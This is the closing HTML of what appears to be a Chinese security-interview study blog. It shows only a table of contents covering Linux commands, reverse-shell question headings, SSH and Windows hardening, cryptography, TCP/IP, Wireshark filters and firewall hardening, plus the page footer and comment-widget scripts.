href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%AB%AF%E5%8F%A3%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%91%BD%E4%BB%A4%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9Fnetstat-%E5%92%8C-ss-%E5%91%BD%E4%BB%A4%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-text">查看当前端口连接的命令有哪些？netstat 和 ss 命令的区别和优缺点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9F%E4%B8%80%E8%88%AC%E5%B8%B8%E5%8F%8D%E5%BC%B9%E5%93%AA%E4%B8%80%E7%A7%8D-shell%EF%BC%9F%E4%B8%BA%E4%BB%80%E4%B9%88"><span class="toc-text">反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Linux%E7%B3%BB%E7%BB%9F%E7%9A%84-x2F-proc%E7%9B%AE%E5%BD%95-%EF%BC%8C%E8%83%BD%E5%A4%9F%E8%8E%B7%E5%8F%96%E5%88%B0%E5%93%AA%E4%BA%9B%E4%BF%A1%E6%81%AF%EF%BC%8C%E8%BF%99%E4%BA%9B%E4%BF%A1%E6%81%AF%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%AE%89%E5%85%A8%E4%B8%8A%E6%9C%89%E5%93%AA%E4%BA%9B%E5%BA%94%E7%94%A8%EF%BC%9F"><span class="toc-text">通过Linux系统的&#x2F;proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux%E7%B3%BB%E7%BB%9F%E4%B8%AD%EF%BC%8C%E6%A3%80%E6%B5%8B%E5%93%AA%E4%BA%9B%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E9%85%8D%E7%BD%AE%E9%A1%B9%EF%BC%8C%E8%83%BD%E5%A4%9F%E6%8F%90%E5%8D%87SSH%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E3%80%82"><span class="toc-text">linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%B8%80%E6%9D%A1%E5%91%BD%E4%BB%A4%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%9C%80%E5%90%8E%E4%B8%80%E7%99%BE%E8%A1%8C"><span class="toc-text">如何一条命令查看文件内容最后一百行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows"><span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8A%A0%E5%9B%BA%E4%B8%80%E4%B8%AA%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84Windows%E6%A1%8C%E9%9D%A2%E5%B7%A5%E4%BD%9C%E7%8E%AF%E5%A2%83%EF%BC%9F%E8%AF%B7%E7%BB%99%E5%87%BA%E4%BD%A0%E7%9A%84%E6%80%9D%E8%B7%AF%E3%80%82"><span class="toc-text">如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%AD%A6"><span class="toc-text">密码学</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AES%EF%BC%8FDES%E7%9A%84%E5%85%B7%E4%BD%93%E5%B7%A5%E4%BD%9C%E6%AD%A5%E9%AA%A4"><span class="toc-text">AES／DES的具体工作步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA%E7%AE%97%E6%B3%95"><span class="toc-text">RSA算法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F"><span class="toc-text">分组密码的加密模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA%E5%AE%89%E5%85%A8%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%9F"><span class="toc-text">如何生成一个安全的随机数？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSL%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B"><span class="toc-text">SSL握手过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E4%B8%8E%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%9A%84%E4%B8%8D%E5%90%8C%EF%BC%8C%E5%88%86%E5%88%AB%E7%94%A8%E5%9C%A8%E5%93%AA%E4%BA%9B%E6%96%B9%E9%9D%A2"><span class="toc-text">对称加密与非对称加密的不同，分别用在哪些方面</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TCP-x2F-IP"><span class="toc-text">TCP&#x2F;IP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E7%9A%84%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E7%9A%84%E7%8A%B6%E6%80%81%E8%BD%AC%E6%8D%A2"><span class="toc-text">TCP三次握手的过程以及对应的状态转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP%E5%92%8CUDP%E5%8D%8F%E8%AE%AE%E5%8C%BA%E5%88%AB"><span class="toc-text">TCP和UDP协议区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#https%E7%9A%84%E5%BB%BA%E7%AB%8B%E8%BF%87%E7%A8%8B"><span class="toc-text">https的建立过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wireshark%E7%AE%80%E5%8D%95%E7%9A%84%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99"><span class="toc-text">wireshark简单的过滤规则</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-text">防火墙</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BA%A4%E6%8D%A2%E6%9C%BA%E3%80%81%E9%98%B2%E7%81%AB%E5%A2%99%E7%AD%89%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%A0%E4%B8%AA%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%E5%8A%A0%E5%9B%BA%E9%A1%B9%EF%BC%8C%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95%E3%80%82"><span class="toc-text">简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</span></a></li></ol></li></ol></div></div></div><footer><nobr><span class="text-title">ICP</span><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">沪ICP备2021037250号-1  </a></nobr><nobr><span class="text-title">©</span><span class="text-content">2022 by i0gan</span></nobr><br></footer></aside></main><canvas id="canvas-dust"></canvas><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
+ el: '#Valine'
+ , appId: 'TzNey4n3v0Sx6vdBbytYLoH9-gzGzoHsz'
+ , appKey: 'GIXXrK9zLxt0bZLww1hte0Oq' , placeholder: '此条评论委托企鹅物流发送'
+});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>
